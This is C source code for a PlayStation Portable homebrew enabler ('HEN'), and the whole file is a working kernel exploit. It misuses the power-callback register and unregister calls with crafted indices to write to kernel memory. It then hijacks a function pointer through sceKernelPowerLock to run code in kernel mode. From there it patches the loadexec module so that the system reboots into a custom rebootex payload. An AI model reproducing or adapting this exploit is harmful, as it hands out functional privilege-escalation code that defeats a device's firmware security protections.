#include <stdio.h>
#include <string.h>

#include "pspsdk.h"
#include "pspkernel.h"
#include "psputility.h"
#include "psputilsforkernel.h"

#ifdef DEBUG
#include "pspdebug.h"
#define printf pspDebugScreenPrintf
#define loginit pspDebugScreenInit
#define log printf
#else
#define loginit()
#define log(fmt...)
#endif

PSP_MODULE_INFO("HEN", 0, 1, 0);

int scePowerUnregisterCallback(u32);
void scePowerRegisterCallback(u32, SceUID);

/* DecompressReboot */
static int (*func_rebootex)(unsigned int, unsigned int, unsigned int, unsigned int, unsigned int);

/* model number */
static int model;

extern int rebootex_size;
extern unsigned char rebootex_start[];

/* sub_000002B4 */
static int
rebootex_callback(unsigned int a1, unsigned int a2, unsigned int a3, 
		unsigned int a4, unsigned int a5)
{
	memcpy((void *) 0x88FC0000, rebootex_start, rebootex_size);
	memset((void *) 0x88FB0000, 0, 256);

	_sw(rebootex_size, 0x88FB0004);
	_sw(model, 0x88FB0000);

	return func_rebootex(a1, a2, a3, a4, a5);
}

#define MAKE_CALL(a, f) _sw(0x0C000000 | (((u32)(f) >> 2) & 0x03FFFFFF), a)

/* sub_00000328 */
static int
power_callback(void)
{
	unsigned int (*_sceKernelFindModuleByName)(char *) = (void *) 0x8801EB78;
	int (*_sceKernelGetModel)(void) = (void *) 0x8800A1C4;
	void (*_sceKernelIcacheInvalidateAll)(void) = (void *) 0x88000E98;
	void (*_sceKernelDcacheWritebackInvalidateAll)(void) = (void *) 0x88000744;
	unsigned int addr;
	int m;

	addr = _sceKernelFindModuleByName("sceLoadExec");
	addr += 108;
	addr = *(unsigned int *) addr;

	m = _sceKernelGetModel();
	if (m == 3)
		m = 2;
	model = m;

	MAKE_CALL(addr + ((m == 4) ? 0x2F28 : 0x2CD8), rebootex_callback);

	/* In PSP 3000, 0x00002D24 of module loadexec is as below:
	 
		0x00002D18: 0x02402021 '! @.' - addu       $a0, $s2, $zr
		0x00002D1C: 0x02A02821 '!(..' - addu       $a1, $s5, $zr
		0x00002D20: 0x02603021 '!0`.' - addu       $a2, $s3, $zr
		0x00002D24: 0x3C018860 '`..<' - lui        $at, 0x8860
		0x00002D28: 0x0020F809 '.. .' - jalr       $at, $ra
		0x00002D2C: 0x03C03821 '!8..' - addu       $a3, $fp, $zr

	   It is entrance to reboot.bin.
	   This line replaces entry to reboot.bin with 0x88FC0000, where
	   rebootex locates.
	*/
	_sw(0x3C0188FC, addr + ((m == 4) ? 0x2F74 : 0x2D24)); /* lui $at, 0x88FC */

	/* restore the effect of scePowerRegisterCallback */
	_sw(0xACC24230, 0x8800CCB0); /* sw v0, 0x4230(a2) */
	_sw(0x0A003322, 0x8800CCB4); /* j 0x0800CC88 */
	_sw(0x00001021, 0x8800CCB8); /* addu $v0, $zr, $zr */
	_sw(0x3C058801, 0x8800CCBC); /* lui $a1, 0x8801 */

	func_rebootex = (void *) addr;

	_sceKernelIcacheInvalidateAll();
	_sceKernelDcacheWritebackInvalidateAll();

	return 0;
}

static void
ClearCaches(void)
{
	sceKernelIcacheInvalidateAll();
	sceKernelDcacheWritebackInvalidateAll();
}

u32
power_offset()
{
	u32 offset;
	SceUID sceuid = sceKernelCreateCallback("hen2", 0, 0);

	scePowerRegisterCallback(0, sceuid);
	scePowerRegisterCallback(0, sceuid);
	__asm__ volatile ("addiu $v0, $v1, 0;" : "=r"(offset));

	return offset;
}

int
main(void)
{
	static int power_buf[0x80000] __attribute__ ((aligned (16)));

	SceUID sceuid;
	unsigned int i;
	u32 scevsh_addr, kernel_entry, entry_addr, offset;

	loginit();

	log("start...\n");

	offset = power_offset();
	log("offset = 0x%08x\n", offset);

	memset(power_buf, 0, sizeof(power_buf));
	log("power unregister 0x%08x\n", (unsigned int) power_buf + 0x78000000U);
	/* 0x78000000 + 0x88000000 will overflow, while addr of power_buf is left */
	scePowerUnregisterCallback((((u32) power_buf) >> 4) + 0x07800000U);
	log("power unregister OK\n");
	ClearCaches();

	sceuid = sceKernelCreateCallback("hen", 0, 0);
	log("power register 0x%08x\n", 0xCCB0U - (offset & 0xFFFFFF));
	/* this line stores 0/nop to 0x8800CCBC */
	scePowerRegisterCallback((0xCCB0U - (offset & 0xFFFFFF)) >> 4, sceuid);
	log("power register OK\n");
	ClearCaches();

	kernel_entry = (u32) power_callback;
	entry_addr = ((u32) &kernel_entry) - 16;

	sceKernelDelayThread(1000000);
	log("suspend intr\n");
	i = sceKernelCpuSuspendIntr();
	sceKernelPowerLock(0, ((u32) &entry_addr) - 0x4234);
	sceKernelCpuResumeIntr(i);
	log("resumed intr\n");

	sceKernelExitGame();
	sceKernelExitDeleteThread(0);

	return 1;
}
